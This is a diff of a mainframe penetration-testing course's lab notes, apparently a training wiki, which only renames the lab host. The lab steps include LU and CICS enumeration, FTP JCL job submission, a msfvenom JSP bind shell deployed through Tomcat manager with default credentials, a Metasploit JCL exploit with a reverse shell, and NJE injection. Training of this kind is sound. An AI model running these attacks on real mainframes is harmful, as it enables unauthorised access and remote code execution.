@@ -8948,7 +8948,7 @@ $ cd tn3270lib
 $ python
 &gt;&gt;&gt; import tn3270lib
 &gt;&gt;&gt; tn3270 = tn3270lib.TN3270()
-&gt;&gt;&gt; tn3270.initiate(&quot;evilmf.evilmainframe.com&quot;,992)
+&gt;&gt;&gt; tn3270.initiate(&quot;evilmf&quot;,992)
 True
 &gt;&gt;&gt; tn3270.connected_lu
 '&lt;Lu Name&gt;'
@@ -8961,7 +8961,7 @@ True
 &gt;&gt;&gt; import tn3270lib
 &gt;&gt;&gt; tn3270 = tn3270lib.TN3270()
 &gt;&gt;&gt; tn3270.set_debuglevel(1)
-&gt;&gt;&gt; tn3270.initiate(&quot;evilmf.evilmainframe.com&quot;,992)
+&gt;&gt;&gt; tn3270.initiate(&quot;evilmf&quot;,992)
 ```
 
 (read through messages until you see 'LU Name: xxxxx')
@@ -8975,7 +8975,7 @@ Use s3270 and bash to enumerate Logical Units.
 ```
 #!/bin/bash
 echo &quot;[+] Getting LUs&quot;
-host=&quot;evilmf.evilmainframe.com&quot;
+host=&quot;evilmf&quot;
 port=&quot;42924&quot;
 echo &quot;&gt;&gt; Using: L:$host:$port&quot;
 for i in `seq 40 60`
@@ -9006,9 +9006,9 @@ for i in H*.txt; do echo &quot;======= $i =======&quot;; cat $i; read; done
 *  ''Note'' You might not grab a screenshot for all the LUs due to the class all doing it at the same time
 
 !!!''Doing this in Nmap''
-* use Nmap to identify the LU: `nmap --script tn3270-screen -sV -p 42924 evilmf.evilmainframe.com`
+* use Nmap to identify the LU: `nmap --script tn3270-screen -sV -p 42924 evilmf`
 ** Notice in the output it says `logical unit:`
-* Try enumerating with Nmap: `nmap --script lu-enum -p 42924 -sV evilmf.evilmainframe.com`
+* Try enumerating with Nmap: `nmap --script lu-enum -p 42924 -sV evilmf`
 
 !!''VTAM Application ID enumeration''
 
@@ -9094,7 +9094,7 @@ Please note:
 * It will only get you so far as logged in
 ** When you use x3270 what are the steps you need to go through to get the `READY` prompt?
 * Call the script with 'three' argument:
-# s3270 host `L:evilmf.evilmainframe.com:992`
+# s3270 host `L:evilmf:992`
 # Your userid
 # Your password
 
@@ -9137,13 +9137,13 @@ EOF
 * Go to `/root/Labs/Day_2/Lab_03` in Kali
 * install py3270 `pip install py3270`
 * ''NOTE'' CICWpwn requires a password, to prevent your neighbor seeing your password do: `echo &quot;your password&quot; &gt; pass.txt`
-* run CICSpwn to list CICS information `python2 ./cicspwn.py -A -U evil0 -P $(cat pass.txt) evilmf.evilmainframe.com 992`
+* run CICSpwn to list CICS information `python2 ./cicspwn.py -A -U evil0 -P $(cat pass.txt) evilmf 992`
 
 !!''Using Nmap to gather CICS info''
 * Nmap can also gather this information
 * In the `Labs/Day_2/Lab_03` folder use the `cics-info.nse` script (until nmap accepts the pull request)
 * You will have to overwrite the script in `/usr/local/share/nmap/scripts`
-* Using `cics-info` script: `/usr/local/bin/nmap --script +/root/Labs/Day_2/Lab_03/cics-info.nse -p 992 evilmf.evilmainframe.com --script-args cics-info.user=&lt;&lt;USERID&gt;&gt;,cics-info.pass=&lt;&lt;password&gt;&gt; -dd -vv`
+* Using `cics-info` script: `/usr/local/bin/nmap --script +/root/Labs/Day_2/Lab_03/cics-info.nse -p 992 evilmf --script-args cics-info.user=&lt;&lt;USERID&gt;&gt;,cics-info.pass=&lt;&lt;password&gt;&gt; -dd -vv`
 </pre>
 </div>
 <div created="20181014040322322" modified="20190515031238301" tags="" title="Lab 4 - FTP Code Execution">
@@ -9180,7 +9180,7 @@ SRCHFOR  'IKJEFT'
 !!''FTP Job Submission''
 Use FTP to execute JCL
 
-* Connect to ''evilmf.evilmainframe.com'' with FTP in linux VM
+* Connect to ''evilmf'' with FTP in linux VM
 * Log on with username and password
 * Issue the FTP command `SITE FILE=JES`
 ** If the command fails try lowercase `site`
@@ -9200,7 +9200,7 @@ The following steps will execute some REXX code using JCL, REXX and FTP.
 ** if it fails you can read the help with `-h` and set it to connect with a reverse CATSO
 
 ```
-./TShOcker.py -p 992 -l --lport &lt;choose a port between 20000-40000&gt; --print evilmf.evilmainframe.com USERNAME PASSWORD &gt; ./JCL_REXX
+./TShOcker.py -p 992 -l --lport &lt;choose a port between 20000-40000&gt; --print evilmf USERNAME PASSWORD &gt; ./JCL_REXX
 ```
 
 * `--print` means 'Print the JCL' (instead of connecting directly with the script)
@@ -9242,7 +9242,7 @@ Use the `--help` flag and read the documentation to accomplish
 !!''Find the Tomcat Server''
 Use nmap, with default options and -sV to find the Tomcat server running:
 
-`nmap -sV evilmf.evilmainframe.com -p 8080`
+`nmap -sV evilmf -p 8080`
 
 !!''Connect''
 * Open firefox and connect to the port identified in the previous step
@@ -9258,7 +9258,7 @@ Use nmap, with default options and -sV to find the Tomcat server running:
 ```
 msfvenom -p java/jsp_shell_bind_tcp LPORT=&lt;port between 20000-30000&gt; -f war &gt; shell_&lt;userid&gt;.war
 ```
-* With firefox browse to `http://evilmf.evilmainframe.com:8080/manager/html`
+* With firefox browse to `http://evilmf:8080/manager/html`
 ** ''Username:'' `tomcat`
 ** ''Password:'' `gibson`
 * In the section ''WAR file to deploy'' click `Browse...`
@@ -9266,7 +9266,7 @@ msfvenom -p java/jsp_shell_bind_tcp LPORT=&lt;port between 20000-30000&gt; -f wa
 * click `Deploy`
 * In the ''Applications'' section in the `Path` column find your deployed page `/shell_&lt;userid&gt;` and click that link
 * It might take a bit for the page to load
-* While its loading try connecting with ncat: `ncat evilmf.evilmainframe.com &lt;your port&gt;`
+* While its loading try connecting with ncat: `ncat evilmf &lt;your port&gt;`
 ** It may take a few tries
 
 ''Questions''
@@ -9291,7 +9291,7 @@ msfvenom -p java/jsp_shell_bind_tcp LPORT=&lt;port between 20000-30000&gt; -f wa
 * At `msf &gt;` prompt type: `use exploit/mainframe/ftp/ftp_jcl_creds`
 * Set the payload with `set payload cmd/mainframe/bind_shell_jcl`
 * Change the FTP User and password: `set FTPUSER &lt;user&gt;` . and `set FTPPASS &lt;password&gt;`
-* Set ''RHOST'' to evilmf: `set rhost evilmf.evilmainframe.com`
+* Set ''RHOST'' to evilmf: `set rhost evilmf`
 * Set ''LPORT'' to a port between 20000 and 40000: `set lport &lt;port&gt;` e.g `set lport 22222`
 * Enable Passive mode: `set PassiveMode true`
 * Type `exploit` to launch the exploit and get a reverse shell
@@ -9309,7 +9309,7 @@ msfvenom -p java/jsp_shell_bind_tcp LPORT=&lt;port between 20000-30000&gt; -f wa
 !!''Find the Tomcat Server''
 Use nmap, with default options and -sV to find the Tomcat server running:
 
-`nmap -sV evilmf.evilmainframe.com -p 8080`
+`nmap -sV evilmf -p 8080`
 
 !!''Connect''
 * Open firefox and connect to the port identified in the previous step
@@ -9325,7 +9325,7 @@ Use nmap, with default options and -sV to find the Tomcat server running:
 ```
 msfvenom -p java/jsp_shell_bind_tcp LPORT=&lt;port between 20000-30000&gt; -f war &gt; shell_&lt;userid&gt;.war
 ```
-* With firefox browse to `http://evilmf.evilmainframe.com:8080/manager/html`
+* With firefox browse to `http://evilmf:8080/manager/html`
 ** ''Username:'' `tomcat`
 ** ''Password:'' `gibson`
 * In the section ''WAR file to deploy'' click `Browse...`
@@ -9333,7 +9333,7 @@ msfvenom -p java/jsp_shell_bind_tcp LPORT=&lt;port between 20000-30000&gt; -f wa
 * click `Deploy`
 * In the ''Applications'' section in the `Path` column find your deployed page `/shell_&lt;userid&gt;` and click that link
 * It might take a bit for the page to load
-* While its loading try connecting with ncat: `ncat evilmf.evilmainframe.com &lt;your port&gt;`
+* While its loading try connecting with ncat: `ncat evilmf &lt;your port&gt;`
 ** It may take a few tries
 
 ''Questions''
@@ -9388,7 +9388,7 @@ The rhost is EVIL
 !!''Display Jes2 Information''
 * go to `Labs/Tools/NJElib`
 * Install bitstring: `pip install bitstring`
-* run iNJEctor replacing `&lt;rhost&gt;` and `&lt;ohost&gt;` with the values above: `./iNJEctor.py &lt;ohost&gt; &lt;rhost&gt; evilmf.evilmainframe.com \$djes2`
+* run iNJEctor replacing `&lt;rhost&gt;` and `&lt;ohost&gt;` with the values above: `./iNJEctor.py &lt;ohost&gt; &lt;rhost&gt; evilmf \$djes2`
 * Enable debugging if you want to see the NJE protocol in detail by adding `-d` before the ohost
 * ''NOTE'' if it fails keep trying, only one person can connect at a time
 * More command here: https://www.ibm.com/support/knowledgecenter/en/SSLTBW_2.3.0/com.ibm.zos.v2r3.hasa200/has2cmdr.htm
@@ -9398,7 +9398,7 @@ The rhost is EVIL
 * Edit the JCL `nop.jcl` in the folder `Labs/Tools/NJElib/JCL`
 * Replace `NEWYORK` with `EVIL`
 * Replace `NOTIFY=&amp;SYSUID` with `NOTIFY=&lt;your userid&gt;,USER=EVIL55`
-* run `jcl.py`: `./jcl.py CLASS EVIL evilmf.evilmainframe.com JCL/nop.jcl EVIL55`
+* run `jcl.py`: `./jcl.py CLASS EVIL evilmf JCL/nop.jcl EVIL55`
 
 </pre>
 </div>
